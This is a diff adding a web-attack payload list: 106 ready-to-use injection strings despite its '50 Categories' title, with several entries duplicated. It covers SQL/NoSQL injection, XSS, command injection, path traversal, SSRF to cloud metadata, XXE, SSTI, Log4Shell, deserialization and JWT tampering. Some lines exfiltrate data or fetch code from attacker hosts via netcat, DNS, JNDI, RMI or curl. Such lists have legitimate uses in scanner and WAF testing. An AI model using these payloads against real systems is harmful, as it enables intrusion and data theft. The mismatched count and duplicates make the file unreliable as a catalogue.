@@ -1,0 +1,108 @@
+Categories of Web Attacks (50 Categories)
+------------------------------------------
+1. SQL Injection (Basic): id=1' OR '1'='1
+2. SQL Injection (UNION-based): id=1 UNION SELECT null, user(), database()--
+3. SQL Injection (Error-based): id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--
+4. SQL Injection (Boolean Blind): id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--
+5. SQL Injection (Time-based Blind): id=1'; WAITFOR DELAY '0:0:5'--
+6. SQL Injection (Postgres Sleep): id=1; SELECT pg_sleep(5)--
+7. SQL Injection (Hex Bypass): id=0x27204f52202731273d2731
+8. SQL Injection (Comment Obfuscation): id=1'/**/OR/**/'1'='1
+9. SQL Injection (Stacked Queries): id=1; DROP TABLE users--
+10. NoSQL Injection (MongoDB GT): {"username": {"$gt": ""}, "password": {"$gt": ""}}
+11. NoSQL Injection (Where Clause): {"$where": "this.user == 'admin'"}
+12. Reflected XSS: <script>alert('XSS')</script>
+13. XSS via Image Attributes: <img src=x onerror=alert(1)>
+14. XSS via SVG Path: <svg/onload=alert(1)>
+15. XSS via Javascript Protocol: javascript:alert(1)
+16. XSS via Body Tag: <body onload=alert(1)>
+17. XSS with Double Encoding: %253cscript%253ealert(1)%253c/script%253e
+18. XSS via Iframe srcdoc: <iframe srcdoc="<script>alert(1)</script>">
+19. XSS via HTML5 Vector: <video><source onerror="alert(1)">
+20. XSS via Tabbed Protocol: java\tscript:alert(1)
+21. Command Injection (Basic): ; cat /etc/passwd
+22. Command Injection (Piping): | id
+23. Command Injection (Subshell): $(whoami)
+24. Command Injection (Backticks): `uname -a`
+25. Command Injection (Logical OR): || ls -la
+26. Command Injection (New line): %0als
+27. Path Traversal (Basic): ../../../../etc/passwd
+28. Path Traversal (Null Byte): ../../../../etc/passwd%00
+29. Path Traversal (URL Encoded): ..%2f..%2f..%2fetc%2fshadow
+30. Path Traversal (Double URL Enc): ..%252f..%252f..%252fetc%252fhosts
+31. Local File Inclusion (PHP Filter): php://filter/convert.base64-encode/resource=index.php
+32. Local File Inclusion (Input Wrapper): php://input
+33. Remote File Inclusion: http://attacker.com/shell.txt
+34. Server-Side Request Forgery (Metadata): http://169.254.169.254/latest/meta-data/
+35. Server-Side Request Forgery (Localhost): http://127.0.0.1:22
+36. XML External Entity (XXE): <!ENTITY xxe SYSTEM "file:///etc/passwd">
+37. SSTI (Jinja2): {{7*7}} or {{config.items()}}
+38. SSTI (Mako): ${os.system('id')}
+39. Log4Shell Payload: ${jndi:ldap://attacker.com/a}
+40. Shellshock: () { :;}; echo "NS:" $(/usr/bin/id)
+41. LDAP Injection: admin*)(| (password=*))
+42. XPath Injection: ' or '1'='1
+43. HTTP Parameter Pollution: id=1&id=2
+44. CRLF Injection: %0d%0aSet-Cookie: session=attacker
+45. Host Header Injection: Host: evil.com
+46. Prototype Pollution: __proto__[admin]=true
+47. Insecure Deserialization (Pickle): cos\nsystem\n(S'id'\ntR.
+48. GraphQL Introspection: query { __schema { types { name } } }
+49. JWT Manipulation (alg none): {"alg":"none"}
+50. Open Redirect: url=http://malicious.com
+51. SQL Injection (Wait-for-Delay Bypass): id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--
+52. SQL Injection (OOB via DNS): id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))
+53. SQL Injection (In-band via XML): id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--
+54. XSS via SVG Template: <svg><script xlink:href="http://attacker.com/xss.js"></script></svg>
+55. XSS via Polyglot Payload: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(f=prompt,f(1))//'>
+56. XSS via Mutation (mXSS): <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+57. XSS via Client-Side Template Injection: {{constructor.constructor('alert(1)')()}}
+58. Path Traversal (UTF-8 Encoded): ..%c0%af..%c0%af..%c0%afetc/passwd
+59. Path Traversal (Windows-specific ..\): ..\..\..\..\windows\system32\config\sam
+60. Path Traversal (Long Path Bypass): //////////////////etc/passwd
+61. Command Injection (Environmental Variable): ; echo $USER | nc attacker.com 1234
+62. Command Injection (Globbing Bypass): ; /bin/c?t /e*c/p?sswd
+63. LFI via PHP Expect Wrapper: expect://id
+64. LFI via Phar Archive: phar://path/to/malicious.phar/shell.php
+65. RCE via Java RMI: rmi://attacker.com:1099/Exploit
+66. RCE via Python eval() in JSON: {"name": "__import__('os').system('id')"}
+67. SSRF via Gopher Protocol: gopher://localhost:6379/_SET%20foo%20bar
+68. SSRF via Dict Protocol: dict://localhost:11211/stat
+69. XXE via Parametric Entities: <!ENTITY % payload SYSTEM "file:///etc/passwd"> %payload;
+70. XXE via XInclude: <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>
+71. SSTI (Velocity): #set($str=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+72. SSTI (Smarty): {smart_f_shell_exec('id')}
+73. SSTI (Twice): {{7*7}}{{ '7'*7 }}
+74. HTTP Request Smuggling (CL.TE): Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1
+75. HTTP Request Smuggling (TE.CL): Content-Length: 4\r\n\r\n1234
+76. HTTP Response Splitting: /index.php?name=Guest%0d%0aSet-Cookie: session=1
+77. LDAP Injection (Attr filter): (&(uid=admin)(|(password=*)))
+78. XPath Injection (Function call): ' or string-length(name(.)) > 0 or '1'='1
+79. SMTP Injection (Header manipulation): %0d%0aBcc: victim@example.com
+80. IMAP Injection: %0d%0a* CAPABILITY
+81. NoSQL Injection (JavaScript Execution $where): {"$where": "function() { return this.name == 'admin' }"}
+82. NoSQL Injection (Bitwise operations): {"id": {"$bitsAllSet": [1, 5]}}
+83. Prototype Pollution (Node.js): {"__proto__": {"isAdmin": true}}
+84. Object Injection (PHP): O:8:"Database":1:{s:4:"host";s:9:"localhost";}
+85. Insecure Deserialization (Java SerialVersionUID): ac ed 00 05 73 72 00 12 ...
+86. Insecure Deserialization (.NET TypeNameHandling): {"$type": "System.Windows.Data.ObjectDataProvider, ..."}
+87. GraphQL Injection (Aliasing): query { a: user(id:1) { name } b: user(id:2) { name } }
+88. GraphQL Injection (Batching): [{"query": "..."}, {"query": "..."}]
+89. JWT Injection (Kid manipulation): {"alg":"RS256","kid":"../../../../dev/null","typ":"JWT"}
+90. JWT Injection (Jku redirection): {"alg":"RS256","jku":"http://attacker.com/key.json"}
+91. Clickjacking (X-Frame-Options bypass attempt): <iframe src="https://target.com" style="opacity:0.5"></iframe>
+92. Tabnabbing (target="_blank" without noopener): <a href="http://malicious.com" target="_blank">Click here</a>
+93. Cache Poisoning Request: X-Forwarded-Host: attacker.com
+94. Slowloris Header Pattern: GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n
+95. BREACH Attack Payload: gzip compressed content with chosen prefix
+96. WebSocket Injection (Malformed frame): \x81\xfe\x00\x00... (illegal length)
+97. Server-Side Request Forgery via PDF Generator: <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+98. Blind SQLi via User-Agent Header: User-Agent: ' OR SLEEP(5) OR '
+99. Path Traversal via ZIP Slip: ../../../../tmp/shell.php (inside zip archive)
+100. RCE via Spring4Shell (CVE-2022-22965): class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B
+101. Real user data capture: call=getRawDataFromDatabase&query=file:///etc/passwd
+102. SQL Injection (Wait-for-Delay Bypass): id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--
+103. SQL Injection (OOB via DNS): id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))
+104. SQL Injection (In-band via XML): id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--
+105. SQL Injection (Blind via Error Message): id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--
+106. Java Attack: adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d
